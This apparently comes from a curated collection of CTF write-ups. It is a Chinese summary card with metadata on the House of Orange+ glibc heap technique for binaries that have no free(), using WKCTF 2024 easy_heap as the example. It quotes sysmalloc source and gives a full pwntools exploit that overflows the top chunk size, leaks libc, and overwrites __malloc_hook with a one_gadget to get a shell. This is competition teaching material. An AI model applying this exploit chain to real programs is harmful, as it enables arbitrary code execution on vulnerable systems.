---
title: House of orange的进一步利用（house of orange+）
contest: 公众号文章（看雪论坛）
year: 2024
difficulty: hard
vuln_type: heap_exploit
tags: [pwn, house-of-orange, no-free, topchunk, sysmalloc, malloc_hook, wkctf-2024]
attack_chain:
  - 条件: 无free但有堆溢出
  - House of Orange: 覆盖topchunk size触发sysmalloc
  - sysmalloc 释放old top → 进入unsorted bin
  - use_top 切割 victim (top chunk)
  - 例题: WKCTF2024 easy_heap
  - add(0xbf0) + add(0x78) + edit堆溢出0x381
  - add(0x3f0) + add(0x208) show leak libc (0x3c4e0a)
  - add(0x7f0) + add(0x360) edit 0x91
  - 改 __malloc_hook-0x23 → 0x68 chunk
  - 写入ogg (one_gadget) 0xf1247
  - add(0x68)*0x13 + p64(ogg) 覆盖__malloc_hook
  - cmd(1)触发 getshell
key_payload: __malloc_hook-0x23 + p64(ogg)  # one_gadget
one_liner: House of orange+：无free时通过堆溢出+top chunk sysmalloc伪造释放
lesson: 堆溢出不free时可改top chunk size触发sysmalloc+_int_free
quality: high
---

# House_of_orange的进一步利用（house_of_orange+）

## 题目信息
- 文章：看雪论坛（JnamerZ 原创）
- 主题：House of orange 进一步利用
- 例题：WKCTF 2024 easy_heap

## 关键攻击链
### 1. 原理
- 条件：
  1. 不能释放 chunk（无 free）
  2. 可以申请、编辑、输出 chunk
  3. 存在堆溢出

### 2. House of Orange 核心
```c
use_top:
    victim = av->top;
    size = chunksize(victim);
    
    if ((unsigned long)(size) >= (unsigned long)(nb + MINSIZE)) {
        // 切割 topchunk
    }
    else if (have_fastchunks(av)) {
        // malloc_consolidate 合并 fastbin
    }
    else {
        void *p = sysmalloc(nb, av);
    }

if (old_size >= MINSIZE) {
    set_head(chunk_at_offset(old_top, old_size), (2 * SIZE_SZ) | PREV_INUSE);
    set_foot(chunk_at_offset(old_top, old_size), (2 * SIZE_SZ));
    set_head(old_top, old_size | PREV_INUSE | NON_MAIN_ARENA);
    _int_free(av, old_top, 1);  // 释放 old top
}
```

### 3. WKCTF 2024 easy_heap 完整 exp
```python
# Step 1: 堆溢出覆盖 top chunk
add(0xbf0, b'a')  # 0
add(0x78, b'a')   # 1
edit(1, 0x78 + 8, flat(cyclic(0x78), 0x381), False)

# Step 2: 触发 sysmalloc → 旧 top 进入 unsorted bin
add(0x3f0, b'a')  # 2
add(0x208, b'')   # 3
show(3)
libc.address = u64(c.recvuntil(b'\x00')[-8:]) - 0x3c4e0a
success(f"libcbase = {hex(libc.address)}")

# Step 3: 进一步利用
add(0x7f0, b'a')   # 4
add(0x360, b'a')   # 5
edit(5, 0x360 + 0x10 + 8, flat(cyclic(0x368), 0x91))
add(0x460, b'a')   # 6
edit(5, 0x360 + 0x18, flat(cyclic(0x368), 0x71, libc.sym['__malloc_hook']-0x23), False)

# Step 4: 触发 __malloc_hook
add(0x68, b'a')   # 11
ogg = libc.address + 0xf1247
add(0x68, b'a'*0x13 + p64(ogg))  # 12 -> &__malloc_hook - 0x13

# Step 5: 触发 getshell
cmd(1)
c.sendline(b'10')
c.interactive()
```

## 评分
- quality: high（无 free 堆溢出 + House of Orange 进阶 + WKCTF 2024 完整 exp）
